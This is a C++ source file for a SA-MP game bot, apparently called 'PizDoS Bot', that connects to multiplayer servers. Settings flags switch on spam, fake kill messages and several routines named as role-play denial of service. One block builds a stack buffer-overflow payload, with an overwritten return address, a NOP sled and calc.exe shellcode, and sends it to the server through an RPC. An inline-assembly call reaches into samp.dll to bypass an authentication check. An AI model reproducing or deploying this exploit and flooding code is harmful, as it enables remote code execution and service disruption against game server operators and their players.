#include "main.h"

RakClientInterface* pClientInterface;
RakClientInterface *pRakClient = NULL;
int iAreWeConnected = 0, iConnectionRequested = 0, iSpawned = 0, iGameInited = 0;
int iReconnectTime = 0 * 0;
PLAYERID g_myPlayerID;
char g_szNickName[32];
int dd=0;
int pong=0;

struct stPlayerInfo playerInfo[MAX_PLAYERS];
struct stVehiclePool vehiclePool[MAX_VEHICLES];

FILE *flLog = NULL;

PLAYERID normalMode_goto = -1;
DWORD dwAutoRunTick = GetTickCount();

#ifdef BULLSHIT_03e_R2
HMODULE samp_dll = NULL;


VOID SAMP_AUTH_BS(DWORD smth, LPVOID genstr, LPVOID output) //smth = 0x000003E6 SEC_BS (0.3eR2 additional security)
{
	if (samp_dll == NULL) return;

	const DWORD auth_bs_offset = 0x27891E;

	DWORD func = (DWORD)samp_dll + auth_bs_offset;
	
	__asm push smth
	__asm push genstr
	__asm push output
	__asm call func
}
#endif

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
	// load up settings
	if(!LoadSettings())
	{
		Log("Failed to load settings");
		getchar();
		return 0;
	}

	if(settings.iConsole)
		SetUpConsole();
	else
	{
		SetUpWindow(hInstance);
		Sleep(500); // wait a bit for the dialog to create
	}

	// RCON mode
	if(settings.runMode == RUNMODE_RCON)
	{
		if(RCONReceiveLoop())
		{
			if(flLog != NULL)
			{
				fclose(flLog);
				flLog = NULL;
			}

			return 0;
		}
	}

#ifdef BULLSHIT_03e_R2
	samp_dll = LoadLibrary("samp.dll");

	if(samp_dll==NULL) {
		Log("Can't load samp.dll and/or bass.dll! Paste it here from your \"GTA San Andreas\" folder.");
		getchar();
		return 0;
	}
#endif

	// set up networking
	pRakClient = RakNetworkFactory::GetRakClientInterface();
	if(pRakClient == NULL)
		return 0;

	pRakClient->SetMTUSize(576);

	resetPools(1, 0);
	RegisterRPCs(pRakClient);

	SYSTEMTIME time;
	GetLocalTime(&time);
	if(settings.iConsole)
	{
		Log(" ");
		Log("* ===================================================== *");
		Log("  Pr0ject Bots v0.2 " RAKSAMP_VERSION " initialized on %02d/%02d/%02d %02d:%02d:%02d",
			time.wDay, time.wMonth, time.wYear, time.wHour, time.wMinute, time.wSecond);
		Log("  Автор: " AUTHOR "");
		Log("* ===================================================== *");
		Log(" ");
	}

	srand((unsigned int)GetTickCount());
	char szInfo[400];
	while(1)
	{
		UpdateNetwork();


		if(settings.ispam) test256();
		if(settings.test1) test();
		if(settings.test21) test24();
		if(settings.test12) test25();
		if(settings.test122) test250();
		if(settings.test133) test251();
		if(settings.test233) test254();
		if(settings.test231) test257();
		if(settings.test18) test256();
		if(settings.test2311) RolePlayDos1();
		if(settings.test23111) RolePlayDos2();
		if(settings.test23112) RolePlayDos3();
		if(settings.test2312) sampSpam();
		if (settings.changer) sampChanger(0);
		if (settings.test23155) RolePlayDos21();
		if (settings.test231555) RolePlayDos31();
		if (settings.test2315555) RolePlayDos32();
		if (settings.fakeKilll) RolePlayDos320();
		if (settings.test231556) RolePlayDos3244();
		if (settings.test231556x) RolePlayDos3d();
		if (settings.test231556xq) RolePlayDos3dq();
		if(settings.ispam) sampSpam();

		if (settings.fakeKill) {
			for(int a=0;a<46;a++){
				for(int b=0;b<getPlayerCount();b++){
					if(settings.fakeKill){
						SendWastedNotification(a, b);
					}
				}
			}
		}


		unsigned char aShellCode[] = 
	{ 
	0xE8, 0x25, 0x00, 0x00, 0x00, 0x5B, 0x81, 0xEC, 
	0x80, 0x00, 0x00, 0x00, 0x6A, 0x01, 0x6A, 0x00, 
	0x6A, 0x00, 0x53, 0x68, 0x78, 0x82, 0x44, 0x00, 
	0x6A, 0x00, 0xB8, 0x94, 0x61, 0x44, 0x00, 0xFF, 
	0x10, 0x6A, 0x00, 0xB8, 0x00, 0x61, 0x44, 0x00, 
	0xFF, 0x10, 0xE8, 0xD6, 0xFF, 0xFF, 0xFF, 0x63, 
	0x61, 0x6C, 0x63, 0x2E, 0x65, 0x78, 0x65, 0x00 
	}; 

	if (settings.lag) { 
	unsigned long iLen; 
	unsigned char aBuffer[4096]; 
	RakNet::BitStream bsSend; 
	//bsSend.Write((BYTE)ID_RCON_COMMAND); 

	memset(aBuffer, 0x49, sizeof(aBuffer)); 

	iLen = 588; // limit of the stack on Windows 

	// New EIP (stack pointer) 

	*(unsigned long*)&aBuffer[iLen] = 0x4165E6; // Windows 
	iLen += 4; // EIP 
	*(unsigned long*)&aBuffer[iLen] = 0x90909090; 
	iLen += 4; 
	memcpy(&aBuffer[iLen], aShellCode, sizeof(aShellCode)); 
	iLen += sizeof(aShellCode); 



	bsSend.Write((unsigned int)iLen); 
	bsSend.Write((char*)aBuffer, iLen); 


	// pClientInterface->RPC("CrashDump", pBitStream, HIGH_PRIORITY, RELIABLE, 0, false, UNASSIGNED_NETWORK_ID, 0); 
	// delete pBitStream; 
	pRakClient->RPC(&RPC_ClickPlayer, &bsSend, HIGH_PRIORITY, RELIABLE, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL); 

		}

		if(!iConnectionRequested)
		{
			if(!iGettingNewName)
				sampConnect(settings.server.szAddr, settings.server.iPort, settings.server.szNickname, settings.server.szPassword);
			else
				sampConnect(settings.server.szAddr, settings.server.iPort, g_szNickName, settings.server.szPassword);

			iConnectionRequested = 1;
		}
		 
		if(iAreWeConnected && iGameInited)
		{
			static DWORD dwLastInfoUpdate = GetTickCount();
			if(dwLastInfoUpdate && dwLastInfoUpdate < (GetTickCount() - 1000))
			{
				sprintf(szInfo, "-|||PizDoS Bot v.CR:MP|||- Пинг - %d",
				playerInfo[g_myPlayerID].dwPing);
				SetWindowText(texthwnd, szInfo);
			}

			if(settings.runMode == RUNMODE_BARE)
				goto bare;

			if(!iSpawned)
			{
				sampRequestClass(settings.iClassID);
				sampSpawn();

				iSpawned = 1;
			}
			else
			{
				if(settings.runMode == RUNMODE_STILL)
				{
					//Nothing left to do :-)
				}

				if(settings.runMode == RUNMODE_NORMAL)
				{
					if(normalMode_goto == (PLAYERID)-1)
						onFootUpdateAtNormalPos();
				}

				// Have to teleport to play_pos so that we can get vehicles streamed in.
				if(settings.runMode == RUNMODE_PLAYROUTES)
				{
					if(rec_state == RECORDING_OFF)
						onFootUpdateAtNormalPos();
				}

				// Run autorun commands
				if(settings.iAutorun)
				{
					if(dwAutoRunTick && dwAutoRunTick < (GetTickCount() - 2000))
					{
						static int autorun;
						if(!autorun)
						{
							Log("Loading autorun...");
							for(int i = 0; i < MAX_AUTORUN_CMDS; i++)
								if(settings.autoRunCMDs[i].iExists)
									RunCommand(settings.autoRunCMDs[i].szCMD, 1);

							autorun = 1;
						}
					}
				}

				// Play routes handler
				if(settings.runMode == RUNMODE_PLAYROUTES)
					vehicle_playback_handler();

				// Following player mode.
				if(settings.runMode == RUNMODE_FOLLOWPLAYER)
				{
					PLAYERID copyingID = getPlayerIDFromPlayerName(settings.szFollowingPlayerName);
					if(copyingID != (PLAYERID)-1)
						onFootUpdateFollow(copyingID);
				}

				// Following player mode.
				if(settings.runMode == RUNMODE_FOLLOWPLAYERq)
				{
					PLAYERID copyingID = getPlayerIDFromPlayerName(settings.szFollowingPlayerNameq);
					if(copyingID != (PLAYERID)-1)
						onFootUpdateFollowq(copyingID);
				}

				// Following a player with a vehicle mode.
				if(settings.runMode == RUNMODE_FOLLOWPLAYERSVEHICLE)
				{
					PLAYERID copyingID = getPlayerIDFromPlayerName(settings.szFollowingPlayerName);
					if(copyingID != (PLAYERID)-1)
						inCarUpdateFollow(copyingID, (VEHICLEID)settings.iFollowingWithVehicleID);
				}

			}
		}

bare:;
		Sleep(20);
	}

	if(flLog != NULL)
	{
		fclose(flLog);
		flLog = NULL;
	}

	return 0;
}

void Log ( char *fmt, ... )
{
	SYSTEMTIME	time;
	va_list		ap;

	if ( flLog == NULL )
	{
		flLog = fopen( "PizDoS Bot.log", "a" );
		if ( flLog == NULL )
			return;
	}

	GetLocalTime( &time );
	fprintf( flLog, "[%02d:%02d:%02d.%03d] ", time.wHour, time.wMinute, time.wSecond, time.wMilliseconds );
	if(settings.iPrintTimestamps)
	{
		if(settings.iConsole)
			printf("[%02d:%02d:%02d.%03d] ", time.wHour, time.wMinute, time.wSecond, time.wMilliseconds );
	}

	va_start( ap, fmt );
	vfprintf( flLog, fmt, ap );
	if(settings.iConsole)
		vprintf(fmt, ap);
	else
	{
		int lbCount = SendMessage(loghwnd, LB_GETCOUNT, 0, 0);
		LPTSTR buf = new TCHAR[512];
		wvsprintf(buf, fmt, ap);

		WPARAM idx = SendMessage(loghwnd, LB_ADDSTRING, 0, (LPARAM)buf);
		SendMessage(loghwnd, LB_SETCURSEL, lbCount - 1, 0);
		SendMessage(loghwnd, LB_SETTOPINDEX, idx, 0);
	}
	va_end( ap );

	fprintf( flLog, "\n" );
	if(settings.iConsole)
		printf("\n");
	fflush( flLog );
}

void gen_random(char *s, const int len)
{
	static const char alphanum[] =
		"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
		"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";

	for (int i = 0; i < len; ++i)
		s[i] = alphanum[rand() % (sizeof(alphanum) - 1)];

	s[len] = 0;
}

void gen_random1(char *s, const int len)
{
	static const char alphanum[] =
		"ewseawedcweaewryewryertdswqdfw"
		"kxhjdnfgxsmrewertrewterdlflc";

	for (int i = 0; i < len; ++i)
		s[i] = alphanum[rand() % (sizeof(alphanum) - 1)];

	s[len] = 0;
}
